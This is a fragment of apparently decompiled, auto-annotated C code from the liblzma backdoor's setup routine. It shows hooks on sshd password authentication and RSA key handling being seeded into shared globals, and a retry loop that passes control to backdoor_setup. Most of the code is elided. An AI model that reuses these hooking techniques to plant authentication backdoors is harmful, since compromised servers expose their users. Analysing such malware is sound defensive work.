 ...
 * `backdoor_setup`. It keeps calling `init_hooks_ctx()` until the helper stops returning 0x65, copying the seeded shared globals
 * into each retry context. Once the block exists it stores the pointers into the params and hands control to `backdoor_setup`.
...

{
  ...
  seed_shared_globals.authpassword_hook_entry = mm_answer_authpassword_hook;
  seed_shared_globals.evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
  seed_shared_globals.global_ctx_slot = (global_context_t **)&global_ctx;
  // AutoDoc: Prime the dummy `lzma_check_state` buffer because `backdoor_setup` expects this struct to hold a valid check context.
  ...
  hooks_init_status = init_hooks_ctx(&bootstrap_hooks_ctx);
  ...
  do {
    if (hooks_init_status == 0) {
      ...
      stage2_success = backdoor_setup(&setup_params_block);
      return stage2_success;
    }
    // AutoDoc: Copy the seeded shared-globals pointer into the retry context so every subsequent `init_hooks_ctx()` call sees the provisional block.
